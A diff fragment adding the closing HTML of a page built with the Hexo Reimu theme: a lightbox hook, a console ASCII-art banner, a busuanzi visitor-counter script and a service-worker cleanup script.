+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
